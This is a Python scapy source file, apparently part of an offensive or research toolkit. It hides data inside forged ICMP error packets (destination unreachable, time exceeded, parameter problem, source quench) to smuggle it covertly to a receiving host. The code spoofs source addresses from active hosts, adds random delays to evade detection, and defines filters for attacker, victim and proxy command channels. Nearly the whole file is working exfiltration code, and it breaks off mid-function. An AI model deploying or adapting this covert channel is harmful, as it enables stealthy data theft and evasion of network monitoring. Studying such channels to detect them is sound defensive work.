import sys, datetime, time, os, ipaddress, string, random
from mymethods import *  

from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
from scapy.all import get_if_hwaddr, sendp, sr1, sniff, send, srp1 
from scapy.all import * 
from enum import Enum



#-----------------------------------------------------------------------  

def TODELETE_get_filter_attack_from_function(self,function_name:str=None, ip_dst=None, checksum=None): 
    if not isinstance(function_name,str) or not IS_TYPE.ipaddress(ip_dst) or not IS_TYPE.integer(checksum): 
        raise ValueError(f"La funzione passata non è una stringa: {type(function_name)} {function_name}")
    if self.attack_dict.get(function_name) is None:
        raise ValueError(f"La funzione non è presente: {function_name}")
    print("function_name: ", function_name)
    match function_name:
        case "ipv4_destination_unreachable": 
            TYPE_DESTINATION_UNREACHABLE=3 
            return f"icmp and (icmp[0]=={TYPE_DESTINATION_UNREACHABLE})" #and dst {ip_host}" 
        case "ipv4_source_quench": 
            TYPE_SOURCE_QUENCH=4  
            return f"icmp and (icmp[0]=={TYPE_SOURCE_QUENCH})" # and dst {ip_host}" 
        case "ipv4_redirect": 
            TYPE_REDIRECT=5
            return f"icmp and (icmp[0]=={TYPE_REDIRECT})" # and dst {ip_host}" 
        case "ipv4_timing_channel_1bit" | "ipv4_timing_channel_2bit" | "ipv4_timing_channel_4bit":
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0
            return f"icmp and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY})" # and dst {ip_host}"  
        case "ipv4_time_exceeded": 
            TYPE_TIME_EXCEEDED=11
            return f"icmp and (icmp[0]=={TYPE_TIME_EXCEEDED})" # and dst {ip_host}"
        case "ipv4_parameter_problem": 
            TYPE_PARAMETER_PROBLEM=12  
            return f"icmp and (icmp[0]=={TYPE_PARAMETER_PROBLEM})" # and dst {ip_host}" 
        case "ipv4_timestamp_request" | "ipv4_timestamp_reply": 
            TYPE_TIMESTAMP_REQUEST=13
            TYPE_TIMESTAMP_REPLY=14
            return f"icmp and (icmp[0]=={TYPE_TIMESTAMP_REQUEST} or icmp[0]=={TYPE_TIMESTAMP_REPLY})" # and dst {ip_host}" 
        case "ipv4_information_request" | "ipv4_information_reply": 
            TYPE_INFORMATION_REQUEST=15
            TYPE_INFORMATION_REPLY=16
            return f"icmp and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})" # and dst {ip_host}"
        #------------------------------------
        case "ipv6_destination_unreachable": 
            TYPE_DESTINATION_UNREACHABLE=1 
            return f"icmp6 and (icmp6[0]=={TYPE_DESTINATION_UNREACHABLE})"# and dst {ip_host.compressed}" 
        case "ipv6_packet_to_big": 
            TYPE_PKT_BIG= 2
            return f"icmp6 and (icmp6[0]=={TYPE_PKT_BIG})"# and dst {ip_host.compressed}" 
        case "ipv6_time_exceeded": 
            TYPE_TIME_EXCEEDED=3  
            return f"icmp6 and (icmp6[0]=={TYPE_TIME_EXCEEDED})"# and dst {ip_host.compressed}" 
        case "ipv6_parameter_problem": 
            TYPE_PARAMETER_PROBLEM=4  
            return f"icmp6 and (icmp6[0]=={TYPE_PARAMETER_PROBLEM})"# and dst {ip_host.compressed}" 
        case "ipv6_timing_channel_1bit" | "ipv6_timing_channel_2bit" | "ipv6_timing_channel_4bit": 
            TYPE_ECHO_REQUEST=128
            TYPE_ECHO_REPLY=129
            return f"icmp6 and (icmp6[0]=={TYPE_ECHO_REQUEST} or icmp6[0]=={TYPE_ECHO_REPLY})"# and dst {ip_host.compressed}"  
        case "ipv6_information_request" | "ipv6_information_reply": 
            TYPE_ECHO_REQUEST=128
            TYPE_ECHO_REPLY=129 
            return f"icmp6 and (icmp6[0]=={TYPE_ECHO_REQUEST} or icmp6[0]=={TYPE_ECHO_REPLY})" # and dst {ip_host}"   

def get_filter_connection_from_function(function_name:str=None, ip_src=None, checksum:int=None, ip_dst=None, interface=None): 
    IPv4_ECHO_REQUEST_TYPE=8
    IPv4_ECHO_REPLY_TYPE=0
    IPv6_ECHO_REQUEST_TYPE=128
    IPv6_ECHO_REPLY_TYPE=129 
    if not isinstance(function_name,str):
        raise ValueError(f"La funzione passata non è una stringa: {type(function_name)} {function_name}")
    match function_name:
        #---------------------
        case "wait_conn_from_proxy" | "wait_proxy_update"| "wait_conn_from_victim": 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            elif ip_src.version==6:
                return f"icmp6 and (icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and src {ip_src.compressed} and icmp[4:2]={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_data_from_proxy" | "wait_conn_from_attacker" | "wait_command_from_attacker": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
                
            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and icmp[0]==8 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}")  
        #---------------------
        case "wait_data_from_vicitm":
            if not isinstance(ip_src,ipaddress.IPv4Address) and not isinstance(ip_src,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(function_name)} {function_name}")
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")

            if ip_src.version==4 and ip_dst.version==4:
                return f"icmp and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            elif ip_src.version==6 and ip_dst.version==6:
                return f"icmp6 and src {ip_src.compressed} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}/{ip_dst.version}") 
        #---------------------
        case "wait_conn_from_proxy":
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}") 
            if not isinstance(checksum, int):
                raise ValueError(f"Il checksum passato non è un intero: {type(function_name)} {function_name}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]==8 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]==128 and dst {ip_dst.compressed} and icmp[4:2]=={checksum}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        case "wait_attacker_command"| "victim_wait_conn_from_proxy" | "wait_icmpEcho_dst": 
            if not isinstance(ip_dst,ipaddress.IPv4Address) and not isinstance(ip_dst,ipaddress.IPv6Address): 
                raise ValueError(f"Il proxy passato non è ne un IPv4Address ne un IPv6Address: {type(ip_dst)} {ip_dst}")
                
            if ip_dst.version==4:
                return f"icmp and icmp[0]=={IPv4_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            elif ip_dst.version==6:
                return f"icmp6 and icmp6[0]=={IPv6_ECHO_REQUEST_TYPE} and dst {ip_dst.compressed}" 
            else: print(f"Caso non contemplato: {ip_src.version}") 
        #---------------------
        #case "":
        #    if ip_src.version==4:
        #        return aaa
        #    elif ip_src.version==6:
        #        return aaa
        #    else: print(f"Caso non contemplato: {ip_src.version}") 

#-----------------------------------------------------------------------
class SendSingleton:  

    def send_data(useDelay=False, useTrueSender=False, tipologia:Enum=None, data:bytes=None, ip_dst:ipaddress.IPv4Address=None): 
        if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst) and IS_TYPE.enum(tipologia) and IS_TYPE.list(host_attivi)): 
            raise Exception(f"Argomenti non corretti") 
        if IS_TYPE.boolean(useTrueSender) and not useTrueSender: 
            classe_host= NETWORK.HOST_ATTIVI() 
            host_attivi= classe_host.active_host
            host_attivi= classe_host.inactive_host
        else: host_attivi, host_inattivi=None,None
        if not IS_TYPE.boolean(useDelay):
            useDelay=False
        if ip_dst.version==4: 
            sender=SendSingleton.SEND_IPV4()
        elif ip_dst.version==6: 
            sender=SendSingleton.SEND_IPV6()
        else: raise Exception("Versione IP non valida: ",ip_dst.version)
        
        block_size=1024 #bytes (1KB) 
        for i in range(0, len(data), block_size): 
            try:
                sender.send_data(data[i:i+block_size]) 
                if useDelay: 
                    print("Waiting...")
                    time.sleep(random.uniform(1.0,15.0)) 
            except Exception as e: 
                print("send data IPV4: ",e) 
    
    def send_host_attivi(lista_host:list[ipaddress.IPv4Address]=None, target_mac=None, interface=None, ip_dst:ipaddress.IPv4Address=None):
        #ip_dst=ipaddress.ip_address("192.168.1.13")
        #interface=NETWORK.INTERFACE_FROM_IP(ip_dst).interface 
        #target_mac = NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower()
        #print("INTERFACE: ",interface)
        #print("TARGET MAC: ",target_mac) 

        #classe_host= NETWORK.HOST_ATTIVI() 
        #host_attivi= classe_host.active_host
        #host_inattivi= classe_host.inactive_host
        #lista_host=[x for x in host_attivi]
        #stringa_host=['{:#b}'.format(ipaddress.ip_address(x)) for x in host_attivi] 
        if not(IS_TYPE.list(lista_host) and len(lista_host)>0 and IS_TYPE.ipaddress(ip_dst) ): 
            raise Exception("Argomenti non corretti")
        msg=MSG.START_SOURCES.value
        for index in range(len(lista_host)): 
            if not IS_TYPE.ipaddress(lista_host[index]):
                print("Host non valido: ", lista_host[index]) 
                continue
            if len(msg+lista_host[index])>=64: 
                print("MESSAGGIO: ",len(msg),"\t",msg)
                #print("IP: ",len(lista_host[index]),"\t",lista_host[index]) 
                pkt = ( 
                    Ether(dst=target_mac)
                    / IP(dst=ip_dst.compressed) 
                    / ICMP(type=0, id=23, seq=0)  
                    /Raw(load=(msg).encode()) 
                ) 
                sendp(pkt, verbose=1, iface=interface) 
                msg=MSG.START_SOURCES.value+lista_host[index]
            else: msg=msg+";"+lista_host[index] 
        print("MESSAGGIO: ",len(msg),"\t",msg)
        pkt = ( 
            Ether(dst=target_mac)
            / IP(dst=ip_dst.compressed) 
            / ICMP(type=0, id=23, seq=0)  
            /Raw(load=(msg+MSG.END_SOURCES.value).encode()) 
        ) 
        sendp(pkt, verbose=1, iface=interface) 
        exit()

    class SEND_IPV4(): 
        tipologia=None 
        ip_dst=None
        target_mac=None
        interface=None 
        host_attivi=None

        def __init__(self, tipologia:Enum=None, ip_dst:ipaddress.IPv4Address=None, host_attivi:list[ipaddress.IPv4Address]=None):
            if not (IS_TYPE.enum(tipologia) and IS_TYPE.ipaddress(ip_dst)): 
                raise Exception(f"Argomenti non corretti") 
            self.tipologia=tipologia
            self.ip_dst=ip_dst 
            if not (target_mac:=NETWORK.GET_MAC_ADDRESS(ip_dst).mac_address.strip().replace("-",":").lower()): 
                raise Exception(f"Impossibile trovare il MAC per l'IP: ",ip_dst.compressed)
            self.target_mac=target_mac
            print(f"MAC per destinazione: {self.target_mac}") 
            if not (interface:=NETWORK.INTERFACE_FROM_IP(ip_dst).interface):
                raise Exception("Impossibile trovare l'interfaccia per l'IP: ",ip_dst.compressed)
            self.interface=interface 
            print(f"Interfaccia per destinazione: {self.interface}") 
            if host_attivi: 
                self.host_attivi=host_attivi
                print("Host Attivi: ",self.host_attivi) 
        
        def send_data(self, data:bytes=None): 
            if not (IS_TYPE.bytes(data) ): 
                raise Exception(f"Argomenti non corretti") 
            match self.tipologia:
                case AttackType.ipv4_destination_unreachable: 
                    self.ipv4_destination_unreachable(data)
                case AttackType.ipv4_destination_unreachable_unused: 
                    self.ipv4_destination_unreachable_unused(data)
                case AttackType.ipv4_time_exceeded: 
                    self.ipv4_time_exceeded(data)
                case AttackType.ipv4_time_exceeded_unused: 
                    self.ipv4_time_exceeded_unused(data)
                case AttackType.ipv4_parameter_problem: 
                    self.ipv4_parameter_problem(data)
                case AttackType.ipv4_parameter_problem_unused: 
                    self.ipv4_parameter_problem_unused(data)
                case AttackType.ipv4_source_quench: 
                    self.ipv4_source_quench(data)
                case AttackType.ipv4_source_quench_unused: 
                    self.ipv4_source_quench_unused(data)
                case AttackType.ipv4_redirect: 
                    self.ipv4_redirect(data)
                case AttackType.ipv4_echo_campi: 
                    self.ipv4_echo_campi(data)
                case AttackType.ipv4_echo_payload: 
                    self.ipv4_echo_payload(data)
                case AttackType.ipv4_echo_campi_payload: 
                    self.ipv4_echo_campi_payload(data)
                case AttackType.ipv4_timestamp_reply: 
                    self.ipv4_timestamp_reply(data)
                case AttackType.ipv4_information_reply: 
                    self.ipv4_information_reply(data)
                case AttackType.ipv4_timing_channel_8bit: 
                    self.ipv4_timing_channel_8bit(data)
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    self.ipv4_timing_channel_8bit_noise(data)
                case AttackType.ipv4_echo_random_payload: 
                    self.ipv4_echo_random_payload(data) 
                case _: raise Exception(f"Tipologia non conosciuta: {slef.tipologia}")
        
        def ipv4_destination_unreachable(self, data:bytes=None): 
            if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(self.ip_dst)): 
                raise Exception(f"Argomenti non corretti")
            TYPE_DESTINATION_UNREACHABLE=3 
            for index in range(0, len(data), 9):
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/\
                    ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3)/\
                    Raw(load=bytes(dummy_ip)[:28]) 
                pkt.summary()
                #pkt.show() 
                raw_bytes = bytes(pkt)
                print(raw_bytes.hex())
                sendp(pkt, verbose=1, iface=self.interface)  if pkt else print("Pacchetto non presente")
            dummy_ip=IP(src=self.ip_dst.compressed, dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/\
                ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3)/\
                Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            print(f"interface: {self.interface}")
            sendp(pkt, verbose=1, iface=self.interface) 
        
        def ipv4_destination_unreachable_unused(self, data:bytes=None): 
            if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(self.ip_dst)): 
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_DESTINATION_UNREACHABLE=3 
            for index in range(0, len(data), 13):
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                            len=int.from_bytes(data[index+4:index+6]), 
                            id=int.from_bytes(data[index+6:index+8]), 
                            ttl=int.from_bytes(data[index+8:index+9])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13])) 
                icmp_hdr = struct.pack(
                    "!BBHI", 
                    TYPE_DESTINATION_UNREACHABLE, #icmp type
                    3, #icmp code
                    0, #checksum
                    int.from_bytes(data[index:index+4]) #unused field
                )
                cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
                cksum &= 0xffff
                icmp_hdr = struct.pack(
                    "!BBHI", 
                    TYPE_DESTINATION_UNREACHABLE, 
                    3, 
                    cksum, 
                    int.from_bytes(data[index:index+4])
                )
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/ Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
                pkt.summary()
                #pkt.show() 
                raw_bytes = bytes(pkt)
                print(raw_bytes.hex())
                sendp(pkt, verbose=1, iface=self.interface)  if pkt else print("Pacchetto non presente")
            dummy_ip=IP(src=self.ip_dst.compressed, dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/\
                ICMP(type=TYPE_DESTINATION_UNREACHABLE, code=3)/\
                Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            print(f"interface: {self.interface}")
            sendp(pkt, verbose=1, iface=self.interface) 
        
        def ipv4_time_exceeded(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti") 
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_TIME_EXCEEDED=11 
            for index in range(0, len(data), 9):
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                            len=int.from_bytes(data[index:index+2]), 
                            id=int.from_bytes(data[index+2:index+4]), 
                            ttl=int.from_bytes(data[index+4:index+5])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/\
                    ICMP(type=TYPE_TIME_EXCEEDED)/\
                    Raw(load=bytes(dummy_ip)[:28])
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_TIME_EXCEEDED)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
        
        def ipv4_time_exceeded_unused(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti") 
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_TIME_EXCEEDED=11 
            for index in range(0, len(data), 13):
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                            len=int.from_bytes(data[index+4:index+6]), 
                            id=int.from_bytes(data[index+6:index+8]), 
                            ttl=int.from_bytes(data[index+8:index+9])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
                icmp_hdr = struct.pack(
                    "!BBHI", 
                    TYPE_TIME_EXCEEDED, #icmp type
                    0, #icmp code
                    0, #checksum
                    int.from_bytes(data[index:index+4]) #unused field
                )
                cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
                cksum &= 0xffff
                icmp_hdr = struct.pack(
                    "!BBHI", 
                    TYPE_TIME_EXCEEDED, 
                    0, 
                    cksum, 
                    int.from_bytes(data[index:index+4])
                ) 
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/ Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_TIME_EXCEEDED)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 

        def ipv4_parameter_problem(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            print(f"START sending to {self.ip_dst}: {data}")
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_PARAMETER_PROBLEM=12 
            for index in range(0, len(data), 10): 
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index+1:index+3]), 
                        id=int.from_bytes(data[index+3:index+5]), 
                        ttl=int.from_bytes(data[index+5:index+6])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+6:index+8]),seq=int.from_bytes(data[index+8:index+10]))
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/\
                    ICMP(type=TYPE_PARAMETER_PROBLEM, ptr=int(data[index]))/\
                    Raw(load=bytes(dummy_ip)[:28])
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) #iface=self.interface
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_PARAMETER_PROBLEM)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
            print("END data has being sent using ICMP Parameter Problem")  
        
        def ipv4_parameter_problem_unused(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argomenti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            print(f"START sending to {self.ip_dst}: {data}")
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_PARAMETER_PROBLEM=12 
            for index in range(0, len(data), 13): 
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
                icmp_hdr = struct.pack(
                    "!BBHB3s", 
                    TYPE_PARAMETER_PROBLEM, #icmp type
                    0, #icmp code
                    0, #checksum
                    int(data[index]), #pointer
                    data[index+1:index+4] #unused field
                )
                cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
                cksum &= 0xffff
                icmp_hdr = struct.pack(
                    "!BBHB3s", 
                    TYPE_PARAMETER_PROBLEM, 
                    0, 
                    cksum, 
                    int(data[index]), #pointer
                    data[index+1:index+4] #unused field
                ) 
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/ Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) #iface=self.interface
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_PARAMETER_PROBLEM)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
            print("END data has being sent using ICMP Parameter Problem")  

        def ipv4_source_quench(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_SOURCE_QUENCH=4 
            for index in range(0, len(data), 9):
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                            len=int.from_bytes(data[index:index+2]), 
                            id=int.from_bytes(data[index+2:index+4]), 
                            ttl=int.from_bytes(data[index+4:index+5])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
                pkt= Ether(dst=self.target_mac)/ IP(src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None, dst=self.ip_dst.compressed, proto=1)/\
                    ICMP(type=TYPE_SOURCE_QUENCH)/\
                    Raw(load=bytes(dummy_ip)[:28])
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface) 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1) / ICMP(id=0,seq=1)
            pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)/ICMP(type=TYPE_SOURCE_QUENCH)/Raw(load=bytes(dummy_ip)[:28])
            pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface)  
        
        def ipv4_source_quench_unused(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(self.ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if self.ip_dst.version!=4:
                print(f"IP version is not 4: {self.ip_dst.version}")
                return False
            if not self.target_mac:
                self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
                print(f"MAC per destinazione: {self.interface}")
            if not self.interface:
                self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
                print(f"Interfaccia per destinazione: {self.interface}")
            print(f"Interfaccia per destinazione: {self.interface}")
            TYPE_SOURCE_QUENCH=4 
            for index in range(0, len(data), 13):
                dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                            len=int.from_bytes(data[index+4:index+6]), 
                            id=int.from_bytes(data[index+6:index+8]), 
                            ttl=int.from_bytes(data[index+8:index+9])) / \
                    ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
                icmp_hdr = struct.pack(
                    "!BBHI", 
                    TYPE_SOURCE_QUENCH, #icmp type
                    0, #icmp code
                    0, #checksum
                    int.from_bytes(data[index:index+4]) #unused field
                )
                cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
                cksum &= 0xffff
                icmp_hdr = struct.pack(
                    "!BBHI", 
                    TYPE_SOURCE_QUENCH, 
                    0, 
                    cksum, 
                    int.from_bytes(data[index:index+4])
                ) 
